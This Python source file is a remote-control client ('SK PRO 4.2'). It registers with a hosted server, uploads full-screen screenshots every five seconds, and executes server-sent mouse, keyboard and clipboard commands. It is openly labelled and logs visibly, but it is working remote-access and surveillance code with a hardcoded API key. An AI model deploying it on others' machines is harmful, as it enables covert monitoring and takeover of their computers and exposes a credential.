"""
SK PRO 4.2 - CLIENT RECEIVER (CLEAN REBUILD)
Registration + Heartbeat + Screenshots + Commands
"""

import time
import threading
import base64
import os
import sys
from io import BytesIO
from datetime import datetime
from PIL import ImageGrab
import requests
import pyautogui
import pyperclip

# ════════════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════════════

LOG_FILE = os.path.join(os.path.expanduser("~"), "SK_PRO_CLIENT.log")

def log(msg, level="INFO"):
    """Log to console and file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_msg = f"[{timestamp}] [{level:10}] {msg}"
    print(log_msg)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_msg + "\n")
    except:
        pass

# ════════════════════════════════════════════════════════════════════
# CONFIG (Injected from Build EXE launcher)
# ════════════════════════════════════════════════════════════════════

SERVER_URL = os.getenv("SERVER_URL", "https://sender-production-32bc.up.railway.app")
USER_API_KEY = os.getenv("USER_API_KEY", "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV")
USERNAME = os.getenv("USERNAME", "client_user")
DEVICE_NAME = "SK-PRO-Client"

HEARTBEAT_INTERVAL = 5   # Every 5 seconds
SCREENSHOT_INTERVAL = 5  # Every 5 seconds
COMMAND_INTERVAL = 10    # Check commands every 10 seconds

HEADERS = {"x-api-key": USER_API_KEY}

# ════════════════════════════════════════════════════════════════════
# STARTUP
# ════════════════════════════════════════════════════════════════════

log("="*80, "START")
log("SK PRO CLIENT RECEIVER v4.2 STARTING", "START")
log("="*80, "START")
log(f"Server: {SERVER_URL}", "CONFIG")
log(f"Username: {USERNAME}", "CONFIG")
log(f"Device: {DEVICE_NAME}", "CONFIG")
log(f"API Key: {USER_API_KEY[:20]}...", "CONFIG")
log(f"Heartbeat: Every {HEARTBEAT_INTERVAL}s", "CONFIG")
log(f"Screenshot: Every {SCREENSHOT_INTERVAL}s", "CONFIG")
log(f"Log File: {LOG_FILE}", "CONFIG")
log("="*80, "CONFIG")

# ════════════════════════════════════════════════════════════════════
# REGISTRATION
# ════════════════════════════════════════════════════════════════════

def register_client():
    """Register client on server on startup"""
    log(f"Registering client as {USERNAME}...", "REGISTER")
    
    try:
        payload = {
            "username": USERNAME,
            "device_name": DEVICE_NAME
        }
        
        resp = requests.post(
            f"{SERVER_URL}/api/client/register",
            json=payload,
            headers=HEADERS,
            timeout=5
        )
        
        if resp.status_code == 200:
            log(f"✅ REGISTERED - Client {USERNAME} is now ONLINE on server", "REGISTER")
            log(f"   Response: {resp.json()}", "REGISTER")
            return True
        else:
            log(f"❌ REGISTRATION FAILED ({resp.status_code}): {resp.text[:100]}", "REGISTER")
            return False
    
    except Exception as e:
        log(f"❌ REGISTRATION ERROR: {str(e)[:100]}", "REGISTER")
        return False

# ════════════════════════════════════════════════════════════════════
# HEARTBEAT
# ════════════════════════════════════════════════════════════════════

current_page = "Startup"
current_activity = "Initializing"

def send_heartbeat():
    """Send heartbeat every N seconds"""
    log("Heartbeat thread started", "THREAD")
    
    while True:
        try:
            payload = {
                "username": USERNAME,
                "page": current_page,
                "activity": current_activity,
                "timestamp": time.time()
            }
            
            log(f"Sending heartbeat...", "HEARTBEAT")
            
            resp = requests.post(
                f"{SERVER_URL}/api/client/heartbeat",
                json=payload,
                headers=HEADERS,
                timeout=5
            )
            
            if resp.status_code == 200:
                log(f"✅ HEARTBEAT SUCCESS - {USERNAME} kept ONLINE", "HEARTBEAT")
            else:
                log(f"❌ HEARTBEAT FAILED ({resp.status_code})", "HEARTBEAT")
        
        except requests.exceptions.Timeout:
            log(f"❌ HEARTBEAT TIMEOUT", "HEARTBEAT")
        except requests.exceptions.ConnectionError:
            log(f"❌ HEARTBEAT CONNECTION ERROR", "HEARTBEAT")
        except Exception as e:
            log(f"❌ HEARTBEAT ERROR: {str(e)[:100]}", "HEARTBEAT")
        
        time.sleep(HEARTBEAT_INTERVAL)

# ════════════════════════════════════════════════════════════════════
# SCREENSHOT
# ════════════════════════════════════════════════════════════════════

def take_screenshot_base64():
    """Capture and encode screenshot"""
    try:
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format="PNG")
        return base64.b64encode(buffer.getvalue()).decode()
    except Exception as e:
        log(f"❌ SCREENSHOT CAPTURE ERROR: {str(e)[:100]}", "SCREENSHOT")
        return None

def send_screenshot():
    """Upload screenshot every N seconds"""
    log("Screenshot thread started", "THREAD")
    
    while True:
        try:
            img_base64 = take_screenshot_base64()
            
            if img_base64:
                log(f"Uploading screenshot... ({len(img_base64)} bytes)", "SCREENSHOT")
                
                payload = {
                    "username": USERNAME,
                    "image_base64": img_base64,
                    "timestamp": time.time()
                }
                
                resp = requests.post(
                    f"{SERVER_URL}/api/client/screenshot",
                    json=payload,
                    headers=HEADERS,
                    timeout=10
                )
                
                if resp.status_code == 200:
                    log(f"✅ SCREENSHOT UPLOADED", "SCREENSHOT")
                else:
                    log(f"❌ SCREENSHOT UPLOAD FAILED ({resp.status_code})", "SCREENSHOT")
        
        except Exception as e:
            log(f"❌ SCREENSHOT ERROR: {str(e)[:100]}", "SCREENSHOT")
        
        time.sleep(SCREENSHOT_INTERVAL)

# ════════════════════════════════════════════════════════════════════
# COMMANDS
# ════════════════════════════════════════════════════════════════════

def check_and_execute_commands():
    """Check for pending commands and execute"""
    log("Commands thread started", "THREAD")
    
    while True:
        try:
            log(f"Checking for commands...", "COMMANDS")
            
            resp = requests.get(
                f"{SERVER_URL}/api/user/commands?username={USERNAME}",
                headers=HEADERS,
                timeout=5
            )
            
            if resp.status_code == 200:
                data = resp.json()
                commands = data.get("commands", [])
                
                if commands:
                    log(f"📦 Received {len(commands)} command(s)", "COMMANDS")
                    
                    for cmd in commands:
                        try:
                            cmd_id = cmd["id"]
                            command = cmd["command"]
                            args = cmd.get("args", "")
                            
                            log(f"Executing: {command}", "COMMANDS")
                            
                            # Execute based on command type
                            if command == "mouse":
                                parts = args.split(",")
                                if len(parts) >= 3:
                                    x, y, action = int(parts[0]), int(parts[1]), parts[2]
                                    if action == "move":
                                        pyautogui.moveTo(x, y)
                                    elif action == "click":
                                        pyautogui.click(x, y)
                                    log(f"✅ Mouse {action} at ({x}, {y})", "COMMANDS")
                            
                            elif command == "keyboard":
                                parts = args.split(",")
                                if len(parts) >= 2:
                                    key = parts[0]
                                    action = parts[1]
                                    if action == "press":
                                        pyautogui.press(key)
                                    elif action == "type":
                                        pyautogui.typewrite(key)
                                    log(f"✅ Keyboard {action}: {key}", "COMMANDS")
                            
                            elif command == "clipboard":
                                pyperclip.copy(args)
                                log(f"✅ Clipboard set", "COMMANDS")
                            
                            # Acknowledge
                            requests.post(
                                f"{SERVER_URL}/api/user/command-ack?cmd_id={cmd_id}",
                                headers=HEADERS,
                                timeout=5
                            )
                            log(f"✅ Command {cmd_id} acknowledged", "COMMANDS")
                        
                        except Exception as e:
                            log(f"❌ Command execution error: {str(e)[:100]}", "COMMANDS")
        
        except Exception as e:
            log(f"❌ Command check error: {str(e)[:100]}", "COMMANDS")
        
        time.sleep(COMMAND_INTERVAL)

# ════════════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════════════

def main():
    """Start all threads"""
    log("""
╔════════════════════════════════════════════════════════════════════════════╗
║                 SK PRO CLIENT RECEIVER v4.2 - RUNNING                     ║
║                    🟢 ONLINE - Ready for Remote Control                   ║
╚════════════════════════════════════════════════════════════════════════════╝
    """, "START")
    
    # Try to register
    if not register_client():
        log("⚠️  Registration failed, will retry via heartbeat", "START")
    
    # Start daemon threads
    threading.Thread(target=send_heartbeat, daemon=True).start()
    threading.Thread(target=send_screenshot, daemon=True).start()
    threading.Thread(target=check_and_execute_commands, daemon=True).start()
    
    log("✅ All threads started", "START")
    log("Client is ONLINE and ready for remote control", "START")
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("❌ Client stopped by user", "STOP")
        sys.exit(0)

if __name__ == "__main__":
    main()

